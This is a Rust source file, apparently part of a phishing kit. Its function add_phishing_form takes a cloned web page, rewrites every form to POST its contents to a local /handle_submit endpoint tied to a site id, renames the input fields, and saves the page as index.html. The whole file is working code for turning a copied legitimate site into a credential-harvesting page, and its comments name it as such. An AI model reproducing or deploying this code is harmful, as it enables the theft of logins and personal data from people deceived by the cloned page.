// Imports
use crate::Errors;
use kuchiki::NodeRef;

// This function will create the phishing form.
// Input document, target directory and site id.
pub async fn add_phishing_form(
    document: &NodeRef,
    target_dir: &str,
    site_id: &str,
) -> Result<(), Errors> {
    // Select all the forms in the document
    let forms = document
        .select("form")
        .map_err(|_| Errors::FormError(format!("Error selecting the forms")))?;

    // Define the url to handle submit
    let action_url = format!("/handle_submit/{}", site_id);
    let mut counter: usize = 1;

    // Each form will now POST to handle_submit/{site_id}
    //  TODO: Improve the implementation and the handle submit function.
    for form in forms {
        if let Some(element) = form.as_node().as_element() {
            // set action url
            element
                .attributes
                .borrow_mut()
                .insert("action", action_url.clone());

            // set POST method
            element
                .attributes
                .borrow_mut()
                .insert("method", "POST".to_string());
        }

        // Select input fields
        let fields = form
            .as_node()
            .select("input, textarea, select")
            .map_err(|_| Errors::FormError(format!("Cannot select the form fields")))?;

        // If there is already a text with that name, assign a different name to the new one: {counter}_{original_name}
        for field in fields {
            if let Some(element) = field.as_node().as_element() {
                let mut attrs = element.attributes.borrow_mut();

                if let Some(original_name) = attrs.get("name") {
                    let new_name = format!("{}_{}", counter, original_name);
                    attrs.insert("name", new_name);
                    counter += 1;
                }
            }
        }
    }

    // Create the final index.html file
    let mut file = std::fs::File::create(format!("{}/index.html", target_dir))
        .map_err(|e| Errors::FormError(format!("Error creating the file {}", e)))?;

    // Copy the document to index.html file
    document
        .serialize(&mut file)
        .map_err(|e| Errors::FormError(format!("Error copying the document to the file {}", e)))?;

    // END
    Ok(())
}
